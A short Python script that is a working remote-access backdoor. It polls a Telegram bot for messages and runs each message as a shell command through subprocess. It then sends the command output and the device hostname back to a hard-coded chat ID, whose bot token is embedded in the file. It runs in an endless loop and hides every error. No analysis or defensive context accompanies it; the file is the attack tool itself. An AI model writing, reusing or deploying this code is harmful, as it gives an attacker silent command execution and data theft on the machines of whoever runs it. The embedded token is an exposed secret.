import requests, os, subprocess, time

# --- SETUP ---
TOKEN = "8298187880:AAHntkCUk5SQQJCJ6oyj58XA0oiMvz21hug"
CHAT_ID = "6603810540"
URL = f"https://api.telegram.org/bot{TOKEN}/"

def send(text):
    requests.post(URL + "sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})

def run_c2():
    last_id = 0
    while True:
        try:
            # Poll Telegram for the latest message
            resp = requests.get(URL + "getUpdates", params={"offset": -1, "timeout": 10}).json()
            if resp.get("result"):
                update = resp["result"][0]
                msg_id = update["update_id"]
                
                if msg_id != last_id:
                    last_id = msg_id
                    cmd = update["message"].get("text", "")
                    
                    if cmd:
                        # Execute any shell command sent via Telegram
                        result = subprocess.getoutput(cmd)
                        send(f"Device: {os.uname()[1]}\nOutput:\n{result}")
        except:
            pass
        time.sleep(10) # Pulse every 15 seconds

if __name__ == "__main__":
    run_c2()
